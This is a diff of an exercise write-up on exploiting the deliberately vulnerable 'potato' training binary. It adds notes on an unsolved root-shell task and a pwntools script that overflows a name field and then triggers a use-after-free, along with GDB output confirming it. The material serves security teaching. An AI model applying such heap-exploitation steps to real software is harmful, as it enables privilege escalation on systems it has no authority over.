@@ -382,7 +382,7 @@ Thus we can see the allcated memory was never freed and leaked after its use.
 
 ## gain a shell with root privileges (look at the allocator with ltrace while creating and deleting users)
 
-**TODO**
+> NOTE: Could not come up with a solution. One major problem was the insufficient manual to compile the potato2 binaries. I could not see more than one chunk in the debugger, this made further analysis practically impossible.
 
 I can here only give a rudimentary description because I did not complete this task and had to rely on Ernst Schwaigers solution. In his solution he had to comment out the `walk_list()` function call and recompile so `potato2` binaries to make this exploit work. In a real world test scenario where you are given software written by a customer this would not be possible, because you can`t add vulnerabilities to a customers software during testing. This should be self explanatory.
 
@@ -400,8 +400,98 @@ delete_user()
     }
 }
 ```
+Apparently the program crashes if the `walk_list()` function is not disabled. 
 
+According to Ernst it is possible to add a "fake" user_list entry and manipulate the linked list of user_entries in a way that we are pointing the root user to the currently logged in user. Thus gaining root privileges.
+
+Because a manipulation of the code is necessary I do not think this is the intedned solution.
 
 ## demonstrate a use after free or double free condition in the program
 
-**TODO**
+Triggering a _use after free_ condition is possible when we are logged in as _peter_ and gained privileged access with our initial exploit, overwriting a t_user struct.
+First we login as the non-privileged user _peter_ and exploit the vulnerability in the `change_name()` function to gain privileged access.
+After that we continue and delete our own user _peter_ while being logged in. This will lead to the chunk containing the user data of _peter_ to still be referenced from the `session.logged_in_user` variable. If we then invoke the `whoami()` function, a _use after free_ condition will be triggered.
+
+The following script executes the described exploit.
+
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+import sys
+
+elf = ELF("./potato")
+# context.binary = elf
+# context.arch = 'i386'
+# context.bits = 32
+# context.endian = 'little'
+# context.os = 'linux'
+
+p = elf.process(["console"], stdin=PTY, aslr=False) # stdin=PTY for "getpass" password input
+gdb.attach(p, '''
+break userlist.c:88
+break func.c:216
+continue
+''')
+
+print(p.recvuntil(b"cmd> ")) # username
+p.sendline(b"login")
+# test user
+p.sendline(b"peter")
+p.sendline(b"12345")
+print(p.recvuntil(b"cmd> ")) # username
+
+p.sendline(b"changename")
+payload = b"\x41"*53
+p.sendline(payload)
+
+p.sendline(b"changename")
+payload = b"\x41"*52
+p.sendline(payload)
+
+p.sendline(b"changename")
+payload = b"peter"
+p.sendline(payload)
+
+p.sendline(b"delete")
+p.sendline(b"2")
+
+p.sendline(b"whoami")
+
+p.interactive()
+```
+
+Whilst stopping at the first breakpoint (`userlist.c:88`) we can inspect the `element->user` that is supposed to being freed in this step.
+We can verify that indeed the chunk of _peter_ is going to be freed.
+
+```bash
+gef➤  p element->user 
+$1 = (t_user *) 0x8050430
+
+gef➤  p *element->user 
+$9 = {
+  name = "peter\000", 'A' <repeats 14 times>,
+  password_hash = 'A' <repeats 32 times>,
+  id = 0x0,
+  gid = 0x2710,
+  home = "/home/peter", '\000' <repeats 38 times>,
+  shell = "/usr/bin/rbash", '\000' <repeats 35 times>
+}
+```
+
+Stopping at the next breakpoint in the `whoami()` function we can inspect the `session.logged_in_user` variable. Here we can clearly see that the already freed chunk for the user _peter_ is still referenced in this variable. The function will read, i.e. "use" this chunk, thus giving us a _use after free_condition.
+
+```bash
+gef➤  p session.logged_in_user 
+$4 = (t_user *) 0x8050430
+
+gef➤  p *session.logged_in_user 
+$3 = {
+  name = "P\200\000\000 .M\256", 'A' <repeats 12 times>,
+  password_hash = 'A' <repeats 32 times>,
+  id = 0x0,
+  gid = 0x2710,
+  home = "/home/peter", '\000' <repeats 38 times>,
+  shell = "/usr/bin/rbash", '\000' <repeats 35 times>
+}
+```
